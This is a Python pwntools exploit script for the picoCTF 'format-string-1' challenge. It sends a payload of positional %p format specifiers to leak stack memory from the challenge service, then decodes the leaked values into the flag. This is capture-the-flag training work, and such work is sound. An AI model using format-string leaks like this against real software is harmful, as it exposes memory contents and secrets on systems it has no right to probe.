#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./format-string-1", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc mimas.picoctf.net 56431"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

payload = b""
for i in range(14, 14 + 8):
    payload += f"%{i}$p|".encode()

io.sendlineafter(b"you:\n", payload)

io.recvuntil(b"your order: ")

leak = io.recvline().decode().split("|")

for l in leak:
    if l == "(nil)":
        break
    print(p64(int(l, 16)).decode(), end='')

io.interactive()
